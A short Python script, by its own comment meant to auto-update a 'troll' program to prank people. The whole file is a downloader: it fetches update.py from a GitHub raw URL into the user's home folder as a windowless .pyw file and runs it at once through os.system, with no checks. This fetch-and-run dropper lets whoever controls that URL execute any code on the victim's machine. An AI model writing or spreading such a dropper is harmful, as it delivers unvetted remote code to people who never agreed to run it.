# Auto Updates the troll.py to troll people :)
import os, time
def main():
    home = os.path.expanduser("~")
    while 1 == 1:
    
        def sleep(Time):
            import time as t
            t.sleep(Time)

        #def trolls():

        def udownload():
            home = os.path.expanduser("~")
            os.chdir(home)
            import urllib.request, pathlib
            dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py'
            path = str(home) + '\update.pyw'
            try:
                os.remove('update.pyw')
            except FileNotFoundError:
                print('Its Safe to Continue')
            urllib.request.urlretrieve(dlurl, '{}'.format(path))
            os.system("start cmd /c {}".format('py ' + path))
            quit()
        udownload()
        sleep(10)
        #trolls()

main()